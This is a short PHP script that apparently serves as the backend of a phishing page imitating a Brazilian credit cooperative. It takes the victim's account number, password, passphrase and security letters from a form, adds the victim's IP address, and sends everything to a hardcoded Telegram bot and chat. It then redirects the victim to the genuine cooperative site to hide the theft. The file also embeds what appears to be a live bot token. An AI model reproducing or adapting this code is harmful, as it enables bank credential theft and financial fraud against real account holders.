
<?php
// Configurações
$telegramBotToken = '6530405815:AAHaXhJb8jejPXnFtEZukX4fz2kW6VRKhUw';
$telegramChatId = '5875771029';

// Função para obter o endereço IP do dispositivo
function getIPAddress() {
    return file_get_contents('https://api64.ipify.org?format=json');
}

// Define o fuso horário para Brasília
date_default_timezone_set('America/Sao_Paulo');

// Obtém a data e hora do envio ajustada para o fuso horário de Brasília
$dataEnvio = date('d/m/Y');
$horaEnvio = date('H:i:s', strtotime('America/Sao_Paulo'));

// Emojis
$emojiPremium = "🟢 🟢 🟢 🟢 🟢";
$emojiRelogio = "\xF0\x9F\x95\x92";

// Recupera os dados do formulário
$opcao = $_POST['opcao'];
$acc = $_POST['acc'];
$pazz = $_POST['pazz'];
$frazz = $_POST['frazz'];
$letraz = $_POST['letraz'];

// Obtém o endereço IP
$ipData = json_decode(getIPAddress(), true);

// Formatação para o Telegram
$formattedIP = "`{$ipData['ip']}`";

// Mensagem para enviar para o Telegram com formatação Markdown
$mensagem = "*$emojiPremium NOVO MOBILE*\n\n" .
    "*Cooperativa:* $opcao\n" .
    "*Conta:* `$acc`\n" .
    "*Senha:* `$pazz`\n" .
    "*Frase:* `$frazz`\n" .
    "*Letras:* `$letraz`\n" .
    "*$emojiRelogio Data do envio:* $dataEnvio\n" .
    "*$emojiRelogio Hora do envio:* $horaEnvio\n" .
    "*📍 Endereço IP: *$formattedIP";

// Envia a mensagem para o Telegram
$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
$dados = [
    'chat_id' => $telegramChatId,
    'text' => $mensagem,
    'parse_mode' => 'Markdown',
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $dados);
$resultado = curl_exec($ch);
curl_close($ch);

// Verifica se a mensagem foi enviada com sucesso
if ($resultado) {
    echo "Mensagem enviada com sucesso!";
} else {
    echo "Erro ao enviar a mensagem para o Telegram.";
}
header("Location: https://ailos.coop.br/");
exit;
?>
